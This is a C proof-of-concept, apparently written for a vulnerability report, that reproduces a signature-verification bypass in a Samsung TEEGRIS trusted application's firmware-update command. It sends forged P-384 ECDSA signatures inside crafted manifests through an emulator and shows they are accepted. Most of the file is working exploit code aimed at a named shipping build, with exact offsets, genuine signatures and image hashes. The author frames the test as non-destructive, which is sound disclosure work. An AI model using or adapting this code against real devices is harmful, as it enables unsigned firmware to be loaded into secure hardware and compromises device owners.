/*
 * ============================================================================
 * HvAUtW (hwvault) cmd 10036 = HV_TZ_CMD_SECNVM_UPDATE_FW_WITH_MANIFEST
 *   S1-1 -- ECDSA-verdict-discard SIGNATURE-VERIFY BYPASS, reproduced in-TA
 *   over the :1337 TEEC protocol against the SHIPPING build S921BXXSFDZE1
 *   (sha256 f7245609a35c...). Non-destructive: FW_NUM=3 (no overflow); the
 *   emulator stubs the SSP so nothing is flashed.
 * ============================================================================
 *
 * THE BUG (RE/samsung_teegris/hvautw.md #1; report S1-1):
 *   swd_hv_strong_check_manifest_signature @0x17B5C computes the P-384 ECDSA
 *   verdict (ECDSA_do_verify @0x18D74) and DISCARDS it: the status byte is
 *   forced to 0 (accept) on both the valid AND invalid branches; only an
 *   o2i_ECPublicKey *parse* failure yields non-zero. So a well-formed but
 *   FORGED signature is accepted. (BoringSSL ECDSA_do_verify returns 1/0 only.)
 *
 * THE GATE (caller hv_secnvm_update_fw_with_manifest @0x10B0C):
 *     0x10D28  bl  swd_hv_strong_check_manifest_signature
 *     0x10D2C  cbz w0, 0x10EB8     ; w0==0 -> PROCEED past the signature gate
 *
 * DETECTION (two channels, no root needed):
 *   (1) HV_TAG_RET_VALUE (0x01000001) in the response TLV = the TA's real cmd
 *       status (the GP `res` is ~always 0 -- the invoke succeeds at GP layer).
 *   (2) The emulator log surfaces the TA's hv_log lines with source line #s.
 *       FORGED smoking gun:
 *         swd_hv_strong_check_manifest:50   "Failed to verify signature"  (ECDSA INVALID)
 *         swd_hv_strong_check_manifest:191  "Verification COMPLETED SUCCESSFULLY" (accepted!)
 *         swd_secnvm_update_fw_with_manifest:193 "[FW Update] Starting firmware update loop"
 *       A correct TA would instead print swd_hv_strong_check_manifest:161
 *       "Signature verification FAILED" and bail.
 *
 * DIFFERENTIAL:
 *   FORGED1 : real P-384 DER sig, one value byte flipped -> ECDSA INVALID,
 *             accepted (THE BUG).
 *   FORGED2 : a DIFFERENT flipped byte -> identical outcome => the result does
 *             not depend on the signature bytes (verdict discarded).
 *   CONTROL : signature trailer removed -> rejected at the trailer parser
 *             (pre-crypto) => the reject path is real and observable.
 *
 * NOTE on the manifest grammar: the parser (sub_19044 key-extractor) is
 * WHITESPACE-SENSITIVE -- it wants compact JSON ("KEY":"VAL"), not the
 * pretty-printed on-disk k250a_fw_image.manifest. We rebuild it compact with
 * the genuine image HASHes and the genuine detached signature (then flip it).
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include "tee_client_api.h"
#include "repro.h"

#define HV_TZ_CMD_SECNVM_UPDATE_FW_WITH_MANIFEST  10036u

#define HV_TAG_S_D6      0x010000D6u
#define HV_TAG_BODYSIZE  0x010000D7u
#define HV_TAG_STARTPOS  0x010000D8u
#define HV_TAG_XFERUNIT  0x010000DEu
#define HV_TAG_FWBLOB    0x020000DCu   /* bytes: signed fw-data blob */
#define HV_TAG_MANIFEST  0x020000DDu   /* bytes: JSON manifest (+sig trailer) -> parsed */
#define HV_TAG_RET_VALUE 0x01000001u   /* scalar: TA's real cmd return */

/* genuine detached signature from k250a_fw_image.manifest (key index 03 -> the
 * hard-coded secp384r1 pubkey[3]; DER 30 66 02 31 00 <r48> 02 31 00 <s48>). */
/* lowercase hex: the TA's hexToByteArray accepts 0-9a-f only (the on-disk
 * manifest is uppercase, so hermesd lowercases before handing it to the TA). */
#define REAL_SIG_HEX \
 "3066023100ec41124b638672c8d1965f11e22f1574dd92099c242a8d1734e92536a050e19f533e7abb467666d63c4ae90def247ce0" \
 "0231009d383bf750a298b3e25c6b1bd3f998941913caf4ebd8c5f4758499e8d30cca670c54cdfc04c30084babbe37b26b9e6f9"
#define HASH_CORE "7ed906b31670df79f6b11ebd839268b4b3f31304c2ebe9a8e8fb44992d5f73ea0b171d9ca2b27641361f183debf576c0"
#define HASH_SNVM "65c03576da2302ce10e732f76718d8aa9ea5fa330008b5cb2bc38d11b0ea9b5978ff034fcc627f5c48072543c180163b"
#define HASH_IWEA "f6dc5992f2647e05b6a02b44c642e67092c73b810e36e9035c3dd319114f4fb28945820a71ca0ba637c39cd8a3f06742"

enum mode { FORGED1, FORGED2, CONTROL_NOSIG };

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*, TEEC_Session*, const TEEC_UUID*,
                                     uint32_t, const void*, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*, uint32_t, TEEC_Operation*, uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

void cleanup_shm(){
#if EMULATE
    system("ipcrm -M 0x13337"); system("ipcrm -M 0x13338");
#endif
}
static inline void put_u32(uint8_t *p, uint32_t v){ memcpy(p, &v, 4); }

static long find_ret_value(const uint8_t *out, int cap){
    uint32_t tag = HV_TAG_RET_VALUE;
    for (int i = 0; i + 8 <= cap; i++)
        if (memcmp(out+i, &tag, 4) == 0){ uint32_t v; memcpy(&v, out+i+4, 4); return (long)v; }
    return -1;
}

/* compact JSON (no whitespace) + sig trailer per mode. */
static int make_manifest(char *buf, int cap, enum mode m){
    int o = snprintf(buf, cap,
        "{\"K250_VERSION\":\"FDZ\",\"FW_NUM\":\"3\",\"FW_IMAGE_LIST\":["
          "{\"IMAGE_TYPE\":\"CORE\",\"IMAGE_VERSION\":\"47000407\",\"HASH\":\"%s\"},"
          "{\"IMAGE_TYPE\":\"SNVM\",\"IMAGE_VERSION\":\"47000400\",\"HASH\":\"%s\"},"
          "{\"IMAGE_TYPE\":\"IWEA\",\"IMAGE_VERSION\":\"47000403\",\"HASH\":\"%s\"}]}",
        HASH_CORE, HASH_SNVM, HASH_IWEA);
    if (m == CONTROL_NOSIG) return o;          /* no signature -> pre-crypto reject */

    char sig[sizeof(REAL_SIG_HEX)];
    memcpy(sig, REAL_SIG_HEX, sizeof(REAL_SIG_HEX));
    if (m == FORGED1) sig[10] = (sig[10]=='e') ? 'c' : 'e';   /* "..3100ec.."->"..3100cc.." */
    if (m == FORGED2) sig[20] = (sig[20]=='8') ? '9' : '8';   /* a different value byte */
    o += snprintf(buf+o, cap-o, ":ECDSA384_SHA384:03:%s", sig);
    return o;
}

static const char *mname(enum mode m){
    return m==FORGED1 ? "FORGED1 (valid DER, wrong crypto)"
         : m==FORGED2 ? "FORGED2 (different wrong crypto)"
                      : "CONTROL (signature removed)";
}

static void run_case(TEEC_Session *sess, uint8_t *in, uint8_t *out, enum mode m){
    static char man[4096];
    int mlen = make_manifest(man, sizeof(man), m);

    memset(in, 0, 0x4000);
    memset(out, 0, 0x1000);
    uint8_t fwdata[64]; memset(fwdata, 0, sizeof(fwdata));
    uint32_t off = 8;
    put_u32(in+off, HV_TAG_S_D6);     put_u32(in+off+4, 0);   off += 8;
    put_u32(in+off, HV_TAG_BODYSIZE); put_u32(in+off+4, 16);  off += 8;
    put_u32(in+off, HV_TAG_STARTPOS); put_u32(in+off+4, 0);   off += 8;
    put_u32(in+off, HV_TAG_XFERUNIT); put_u32(in+off+4, 64);  off += 8;
    put_u32(in+off, HV_TAG_FWBLOB);   put_u32(in+off+4, sizeof(fwdata));
    memcpy(in+off+8, fwdata, sizeof(fwdata)); off += 8 + sizeof(fwdata);
    /* declare the true length mlen (the TA gates on strlen(manifest) >= len at
     * 0x17c78). Run the emulator with TAEMU_WEAPONIZE=1 so the parser's
     * by-design strlen/strchr over-reads hit adjacent heap (no redzone) like
     * real hardware, instead of an asan trap. */
    put_u32(in+off, HV_TAG_MANIFEST); put_u32(in+off+4, (uint32_t)mlen);
    memcpy(in+off+8, man, (uint32_t)mlen); off += 8 + (uint32_t)mlen;
    put_u32(in+0, HV_TZ_CMD_SECNVM_UPDATE_FW_WITH_MANIFEST);
    put_u32(in+4, off - 8);

    TEEC_Operation op; memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_OUTPUT,
                                     TEEC_NONE, TEEC_NONE);
    op.params[0].tmpref.buffer = in;  op.params[0].tmpref.size = 0x4000;
    op.params[1].tmpref.buffer = out; op.params[1].tmpref.size = 0x1000;

    uint32_t origin = 0;
    printf("\n========== CASE: %s ==========\n", mname(m));
    TEEC_Result res = TEEC_InvokeCommand_impl(sess, HV_TZ_CMD_SECNVM_UPDATE_FW_WITH_MANIFEST,
                                              &op, &origin);
    long rv = find_ret_value(out, 0x1000);
    printf("[*] GP res=0x%08x   HV_TAG_RET_VALUE=%ld%s\n", res, rv,
           rv < 0 ? "  (absent)" : (rv == 24 ? "  (24 = manifest-verify reject)" :
                                    rv == 0  ? "  (0 = full success)" : "  (downstream stage)"));
}

int main(void)
{
    char* ta = "00000000-0000-0000-0000-487641557457";
    TEEC_UUID *uuid = teegris_uuid(ta);
    TEEC_Context ctx; TEEC_Session sess; uint32_t origin;

    cleanup_shm();
    load_functions();
    if (TEEC_InitializeContext_impl(NULL, &ctx) != TEEC_SUCCESS){ printf("init failed\n"); exit(-1); }
    if (TEEC_OpenSession_impl(&ctx, &sess, uuid, TEEC_LOGIN_PUBLIC, NULL, NULL, &origin) != TEEC_SUCCESS){
        printf("OpenSession failed\n"); exit(-1);
    }
    printf("[*] session opened to HvAUtW (hwvault) SFDZE1\n");

    uint8_t *in  = (uint8_t*)allocate_param_mem(&ctx, 0x4000);   /* allocated ONCE, reused */
    uint8_t *out = (uint8_t*)allocate_param_mem(&ctx, 0x1000);
    if (!in || !out){ printf("alloc failed\n"); exit(-1); }

    run_case(&sess, in, out, FORGED1);
    run_case(&sess, in, out, FORGED2);
    run_case(&sess, in, out, CONTROL_NOSIG);

    printf("\n==================== VERDICT ====================\n");
    printf("FORGED1 ret == FORGED2 ret, and both != CONTROL ret  => ECDSA verdict discarded.\n");
    printf("Confirm in confirmations/_logs/<name>.log: for a FORGED case,\n");
    printf("  swd_hv_strong_check_manifest:50  'Failed to verify signature'  (ECDSA INVALID), then\n");
    printf("  swd_hv_strong_check_manifest:191 'Verification COMPLETED SUCCESSFULLY' (accepted anyway)\n");
    printf("  => reaching the proceed block (gate 0x10D2C cbz w0,0x10EB8) with a bad sig = S1-1.\n");

    TEEC_CloseSession_impl(&sess);
    TEEC_FinalizeContext_impl(&ctx);
    return 0;
}
